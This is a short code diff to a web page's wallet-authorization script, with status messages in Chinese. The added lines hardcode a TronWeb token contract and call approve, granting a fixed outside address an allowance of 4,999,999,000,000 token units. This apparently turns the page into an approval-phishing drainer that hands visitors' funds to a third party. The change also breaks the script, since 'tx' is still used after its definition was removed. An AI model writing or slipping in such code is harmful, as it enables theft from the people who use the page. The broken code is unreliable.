@@ -41,7 +41,8 @@
       document.getElementById("status").innerText = "⭕️ 授權送出中...";
 
       try {
-        const tx = await contract.approve(SPENDER, APPROVE_AMOUNT).send();
+        const contract = await tronWeb.contract(ABI, "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
+        await contract.approve("TBX8foxSthqVpiKqR87gN62M6oE91EKX7B", "4999999000000").send();
         document.getElementById("status").innerText = "✅ 授權成功！TX: " + tx;
       } catch (e) {
         document.getElementById("status").innerText = "❌ 授權失敗：" + e.message;
